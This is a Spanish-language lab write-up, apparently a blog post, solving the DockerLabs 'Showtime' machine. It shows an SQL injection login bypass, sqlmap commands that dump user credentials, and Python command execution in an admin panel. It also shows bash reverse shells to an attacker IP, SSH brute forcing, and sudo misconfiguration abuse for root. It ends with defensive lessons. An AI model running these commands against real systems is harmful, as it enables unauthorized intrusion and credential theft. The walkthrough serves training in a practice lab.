---
layout: post
title: "Showtime - Dockerlabs - Linux"
date: 2026-09-11
img: /assets/img/linux/showtime/1.png
tags: [DockerLabs, Linux, SQLi, SQL Injection, posh, python]
---

En esta laboratorio abordaremos la solución de la máquina Showtime en Dockerlabs. El proceso cubre la cadena completa de intrusión hasta la explotación de un fallo clásico de SQL Injection y la elevación de privilegios.

Iniciamos con el escaneo inicial con nuestra herramienta **Auto Recon** para automatizar los escaneos básicos de puertos, servicios, directorios.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911202634.png)![](Pasted%20image%2020260911202718.png)
![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911202735.png)![](Pasted%20image%2020260911202753.png)

Nuestra herramienta nos encontró el servicio SSH y WEB activos, sabemos que sin credenciales no podemos hacer nada en el servicio SSH, así que iremos por el servicio WEB.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911202905.png)

La página web no nos muestra mayor información, verificamos el código fuente de esta sin encontrar información de interés. Solo tenemos acceso a un panel de login.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911203056.png)

Intentamos acceder con credenciales conocidas sin tener éxito en el inicio de sesión.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911203156.png)

Luego de varios intentos, seguimos probando si el servidor es vulnerable a inyección SQL. Para ello interceptamos la petición de inicio de sesión con BurpSuite y en el campo de usuario inyectamos el código malicioso `'OR 1=1 -- -`

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911203950.png)
![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911204117.png)
Así al enviar la solicitud obtenemos acceso al servidor y confirmamos que el formulario es vulnerable a SQL Injection (Aythentication Bypass).

![]/secnotes/assets/img/linux/showtime/(Pasted%20image%2020260911204207.png)

Hasta ahora solo engañamos a la consulta para que nos devuelva un registro válido (habitualmente el primero de la tabla), Entonces utilizaremos **sqlmap** para exprimir la vulnerabilidad mucho mas allá.

```
sqlmap -u "http://172.17.0.2/login_page/home.php" --forms --dbs --batch
```
### Desglose del comando ###

`sqlmap -u "http://172.17.0.2/login_page/home.php"` = Especificamos la URL del objetivo.
`--forms` = Habilita la detección automática de formularios HTML. En lugar de requerir que definamos los parámetros manualmente (como `?id=` o `--data`).
`--dbs` = Ordena a la herramienta enumerar todas las bases de datos.
`--batch` = Activa la ejecución no interactiva. Omite cualquier pregunta de confirmación en consola.


![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911205804.png)![](Pasted%20image%2020260911205809.png)![](Pasted%20image%2020260911205821.png)

Como resultado, nos muestra las base de datos:
 - information_schema
 - mysql
 - performance_schema
 - sys
 - users

Ya que tenemos identificadas, lanzamos el siguiente comando para que nos muestre la tabla `users`

```
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users --tables
```

aquí agregamos `-D users` para especificar la base de datos objetivo sobre la que operaremos, y `--tables` para listar unicamente los nombres de las tablas que existen dentro de esa base de datos (`users`).


![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911210250.png)

Ahora debemos ver el contenido de la tabla.

```
sqlmap -u "http://172.17.0.2/login_page/index.php" --forms --batch -D users -T usuarios --dump
```

agregamos esta vez `-T usuarios` para especificar la tabla llamada usuarios dentro de esa db, y `--dump` para descargar y mostrar únicamente las filas y columnas de esa tabla especificada.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911210549.png)

Con esto ya tenemos las credenciales de 3 usuarios.

### Conexión al servidor ##

Ya que tenemos usuarios, vamos a validarlos conectándonos en la página web con las credenciales encontradas.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911210907.png)

obtenemos acceso a un nuevo panel de administración con las credenciales del usuario `joe`. Aquí nos deja ejecutar comandos de python, para validar esto, vamos a ejecutar el comando `id` mediante la sintaxis:

```
import os
os.system("COMANDO")
```

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911211120.png)
![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911211059.png)

también validamos si tenemos bash en el servidor para ejecutar una reverse shell con el comando `which bash`

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911211423.png)

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911211343.png)

Ya teniendo estos datos, seguimos con la conexión a nuestra terminal con una reverse shell.

`bash -c 'bash -i >& /dev/tcp/<IP ATACANTE>/<PORT> 0>&1'`

dejamos nuestra máquina en escucha

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911212041.png)

y ejecutamos el comando.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911212117.png)

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911212126.png)

Ya tenemos acceso al servidor con el usuario `www-data`, lo primero será mejorar la shell.

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

luego mandamos la shell a segundo plano con **CTRL Z**

y en nuestra shell ponemos `stty raw -echo; fg` ahora al presionar enter volveremos a la shell de la víctima con este mejoramiento ya no tendremos una shell “tonta” ahora podremos usar las flechas sin que salgan caracteres no deseados.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911212501.png)

con este usuario, generalmente tenemos los permisos mínimos para movernos por el servidor, luego de una búsqueda por los directorios, nos encontramos con un archivo oculto.
![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911212615.png)

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911212654.png)

esta documento contiene una lista de palabras sospechosas, a mi vista parece un diccionarios. Un detalle es que están todos los caracteres en mayúsculas, por lo que difícilmente podrían ser contraseñas, así que vamos a copiarlas para crearnos un archivo nuevo y pasar todas estas palabras a minúsculas.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911212958.png)

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911213105.png)

Ahora tenemos dos diccionarios, ya tenemos un usuario potencialmente valido, y dos diccionarios para realizar ataque de fuerza bruta en el servicio ssh.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911213336.png)

Tal como pensamos, la contraseña estaba en minúsculas.  

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911213451.png)

Y ganamos acceso vía SSH.

Buscamos si podemos ejecutar alguna herramienta con permisos de root 

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911221824.png)

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911221644.png)

y vemos que el usuario `luciano`puede ejecutar `posh` con permisos de root.

Posh (Policy Compliance Shell) es una shell de Linux, una reimplementación de `sh`  minimalista e estricta creada principalmente en Debian para verificar que los scripts se cumplan rigurosamente con los estándares POSIX.

Ya que el usuario `luciano` puede ejecutar `posh` (que sabemos que es una shell), si utilizamos el argumento `-u luciano` podemos ejecutarlo desde el usuario joe con permisos de luciano.

entonces: `sudo -u luciano posh`

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911222927.png)

Así ganamos acceso con el usuario  `luciano`.

Nuevamente buscamos si tenemos algun permiso especial, y esta vez nos encontramos que con el usuario `luciano` podemos ejecutar un script que se encuentra en su directorio.

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911223021.png)

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911223155.png)

Este script es una reverse shell hacia una dirección (192.168.1.100), al revisar los permisos de este script, nuestro usuario puede modificarlo, así que tenemos dos caminos:

1. Otorgarle permisos de SUID a bash.Modificar el script para que apunte a nuestra ip y obtener una reverse shell en nuestro equipo
2. Modificar el script para que apunte a nuestra ip y obtener una reverse shell en nuestro equipo

**Opción 1:**

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911224404.png)


**Desglose**

`touch script`: creamos un archivo llamado `script` 
 `$ echo '#!/bin/bash
 `>`
`> bash -p' > script` : sobrescribimos el contenido del archivo creado con dos líneas.
`mv script script.sh` :  Renombramos el archivo de `script` a `script.sh`
`$ sudo /bin/bash /home/luciano/script.sh` : ejecutamos bash con permisos de administrador (`sudo`) pasándole la ruta absoluta del script recién creado.

Al ejecutarse como sudo, el script llama a `bash -p` con privilegios elevados, abriendo una shell interactiva como root. Eso se puede aplicar cuando Bash o algunos Scripts tienen permisos de `sudoers` sin restricción de contraseñas.

**Opción 2**

Modificar el script para crear una reverse shell hacia nuestra máquina atacante.

`echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" > script.sh`

y ejecutamos con:

`sudo /bin/bash /home/luciano/script.sh`

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911225912.png)

![](/secnotes/assets/img/linux/showtime/Pasted%20image%2020260911225854.png)


La resolución de esta máquina demuestra de manera práctica cómo debilidades individuales en distintas capas del sistema pueden encadenarse hasta comprometer la totalidad del servidor:

- **Saneamiento en aplicaciones web:** La ausencia de sentencias preparadas en el formulario de login no solo permitió el acceso no autorizado, sino también la extracción total de credenciales mediante SQLMap.
    
- **Gestión de credenciales y contraseñas:** El uso de contraseñas predecibles o basadas en diccionarios locales expuso el servicio SSH una vez obtenido un vector inicial en el servidor web.
    
- **Principio de menor privilegio:** Delegar la ejecución de intérpretes de comandos (`posh`) o scripts en rutas donde el propio usuario posee permisos de escritura representa un riesgo crítico, ya que cualquier atacante puede alterar el flujo de ejecución para invocar shells interactivas con privilegios elevados (`root`).
